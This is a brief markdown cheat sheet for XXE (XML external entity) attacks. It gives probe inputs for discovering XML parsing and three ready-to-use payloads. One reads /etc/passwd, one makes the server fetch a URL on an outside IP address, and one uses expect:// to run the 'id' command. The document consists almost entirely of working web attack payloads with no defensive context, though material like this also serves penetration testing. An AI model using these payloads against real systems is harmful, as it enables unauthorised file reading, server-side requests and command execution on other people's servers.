# XXE

## Discovery
- Find ```xml``` in error of these payloads
  - ```.php?xml=>```
  - ```.php?xml=/>```

## Payloads
- ```<!DOCTYPE foo[<!Entity xxe SYSTEM "file:///etc/passwd">]> <foo>&xxe;</foo>```
- ```<!DOCTYPE data [<!ENTITY passwd SYSTEM "http://192.255.164.2:9000/helloworld">]> <data><text>&passwd;</text></data>```
- ```<!Entity xxe SYSTEM "expect://id">]>```
